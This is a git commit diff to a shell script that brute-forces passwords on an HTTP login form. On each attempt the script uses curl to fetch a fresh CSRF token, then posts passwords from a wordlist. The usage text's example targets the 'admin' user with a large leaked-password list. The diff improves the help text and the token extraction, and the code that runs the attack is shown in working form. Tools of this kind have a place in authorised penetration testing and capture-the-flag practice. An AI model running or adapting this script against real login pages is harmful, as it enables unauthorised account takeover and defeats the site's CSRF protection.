c6500a161f6717eb881e929e889ccb79841cad30
isabellecda <7978895+isabellecda@users.noreply.github.com>
2021-06-11 09:33:35 -0300

    Update http-csrf-curl.sh

--- http-csrf-curl.sh
+++ http-csrf-curl.sh
@@ -12,12 +12,23 @@
 #error_msg="Incorrect user or password" 
 
 # Usage
+
 if [ -z "${6}" ]
 then
-	echo "Usage: $0 form_page token_tag passsword_tag other_post_data password_file error_message"
-	echo " "
+	echo "Usage: $0 form_page token_name passsword_name other_post_data wordlist error_message"
+	echo ""
+	echo "Parameters:"
+	echo "	form_page 	: HTTP POST form web page"
+	echo "	token_name 	: Name of the hidden form input with the the CSRF token as value"
+	echo "			Example: token_name is 'mytoken' in the following form input:"
+	echo "			<input type=\"hidden\" name=\"mytoken\" value=\"437cf6a86b75d968d2896b\" />"
+	echo "	passsword_name 	: Name of the password form input"
+	echo "	other_post_data : Other data to be sent in the form POST request"
+	echo "	wordlist 	: Wordlist to be used as password in the brute force attack"
+	echo "	error_message 	: Error message to identify that the password input was not correct"
+	echo ""
 	echo "Example:"
-	echo "$0 http://mypage.com/login/index.php token pass 'user=admin&submit=Send' '/usr/share/seclists/Passwords/xato-net-10-million-passwords-100.txt' 'Incorrect user or password'"
+	echo "	$0 http://mypage.com/login/index.php token pass 'user=admin&submit=Send' '/usr/share/seclists/Passwords/xato-net-10-million-passwords-100.txt' 'Incorrect user or password'"
 	exit
 fi
 
@@ -32,8 +43,8 @@ while read line
 do
 	passwd=$line
 
-	# Change this line to correctly extract your token (awk)
-	token=$(curl -s -c cookies.txt "${formpage}" | grep "$token_tag" | awk 'BEGIN { FS="\""} {print $6}')
+	# Change this line to get token
+	token=$(curl -s -c cookies.txt "${formpage}" | grep hidden | grep "${token_tag}" | grep -Pio 'value="\K[^"]*')
 
 	output=$(curl -s -b cookies.txt "${formpage}" --data-raw "${passwd_tag}=${passwd}&${token_tag}=${token}&${otherdata}")
 
@@ -49,4 +60,3 @@ do
 done < $filename
 
 rm cookies.txt
-
